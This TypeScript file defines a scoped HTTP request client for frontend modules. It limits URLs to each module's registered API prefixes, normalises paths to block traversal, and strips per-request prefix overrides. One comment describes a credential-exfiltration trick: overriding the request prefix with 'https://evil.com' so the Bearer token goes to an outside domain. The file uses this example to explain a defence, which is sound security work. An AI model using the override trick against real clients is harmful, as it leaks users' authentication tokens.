import type { Options } from "ky";

import { request } from "./index";

/**
 * P6.3 / D11：模块专用 scoped request client。
 *
 * 模块不再拿到全局 request——它以模块登记的 apiPrefix 为边界收敛：
 * 请求 URL 必须以 `ctx.register.apiPrefix()` 声明的**任一**前缀开头，越界直接
 * 拒绝（人话报错）。前缀读取是惰性的（每次请求时求值），因此允许模块
 * 在生命周期中先发请求前登记、甚至追加登记。
 *
 * 这是纵深防御的前端一半；后端逐接口鉴权仍是安全兜底（§4.8 授权行）。
 */

type GlobalRequest = typeof request;

/** 仅暴露安全子集：callable + HTTP verb 工厂；不给 create/extend（可绕过 hooks） */
export function createScopedRequest(
	moduleName: string,
	/**
	 * 惰性取已登记前缀。一模块可登记多个（多个生成 client 各自登记），
	 * 传数组即「命中任一放行」；兼容单值写法。
	 */
	getPrefix: () => string | readonly string[] | undefined,
	/** 注入底层实例，测试用 */
	underlying: GlobalRequest = request,
): GlobalRequest {
	function guard(rawUrl: string): void {
		const registered = getPrefix();
		const prefixes = (Array.isArray(registered) ? registered : [registered]).filter(
			(prefix): prefix is string => typeof prefix === "string" && prefix.length > 0,
		);
		if (prefixes.length === 0) {
			throw new Error(
				`[module] 模块 "${moduleName}" 尚未登记 API 前缀：请先在生命周期中调用 `
				+ "ctx.register.apiPrefix(\"/your-prefix\") 再发起请求。",
			);
		}
		// P7.2：先经 URL 归一化（折叠 ../ 与反斜杠），再按路径段边界匹配——
		// 裸 startsWith 会放行兄弟前缀（/sys → /sysadmin）与路径穿越
		// （/sys/../admin 折叠后越界）。
		let pathname: string;
		try {
			pathname = new URL(rawUrl, "http://scoped.local").pathname;
		}
		catch {
			pathname = rawUrl;
		}
		const allowed = prefixes.some((prefix) => {
			const boundary = prefix.endsWith("/") ? prefix.slice(0, -1) : prefix;
			return pathname === boundary || pathname.startsWith(`${boundary}/`);
		});
		if (!allowed) {
			throw new Error(
				`[module] 模块 "${moduleName}" 请求越界：${rawUrl} 不在其登记前缀 ${prefixes.join("、")} 内。`
				+ "请调整接口路径，或登记正确前缀（D11 安全收敛）。",
			);
		}
	}

	/**
	 * P7.2：剥离逐请求 prefix/prefixUrl——ky 2.x 允许逐请求覆盖默认 prefix，
	 * 否则 `scoped.get("sys/x", { prefix: "https://evil.com" })` 会带着
	 * beforeRequest 注入的 Bearer token 打到任意外域（凭据外泄）。
	 */
	function sanitize(options?: Options): Options | undefined {
		if (!options)
			return options;
		const { prefix: _prefix, prefixUrl: _prefixUrl, ...rest } = options as Options & { prefixUrl?: string };
		return rest;
	}

	const scoped = ((url: string | URL, options?: Options) => {
		guard(String(url));
		return underlying(url as string, sanitize(options));
	}) as GlobalRequest;

	for (const method of ["get", "post", "put", "patch", "delete", "head"] as const) {
		scoped[method] = ((url: string | URL, options?: Options) => {
			guard(String(url));
			return underlying[method](url as string, sanitize(options));
		}) as GlobalRequest[typeof method];
	}

	return scoped;
}
